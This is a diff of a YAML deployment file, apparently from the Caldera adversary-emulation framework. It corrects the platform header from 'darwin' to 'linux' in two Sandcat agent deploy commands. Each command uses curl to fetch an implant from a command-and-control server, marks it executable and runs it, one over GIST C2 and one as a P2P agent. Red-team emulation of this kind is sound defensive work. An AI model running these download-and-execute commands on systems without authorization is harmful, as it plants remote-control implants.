@@ -59,13 +59,13 @@
           - description: Download with GIST C2
             command: |
               server="#{app.contact.http}";
-              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
               chmod +x #{agents.implant_name};
               ./#{agents.implant_name} -c2 GIST -v
           - description: Deploy as a P2P agent with known peers included in compiled agent
             command: |
               server="#{app.contact.http}";
-              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
               chmod +x #{agents.implant_name};
               ./#{agents.implant_name} -server $server -listenP2P -v
     windows:
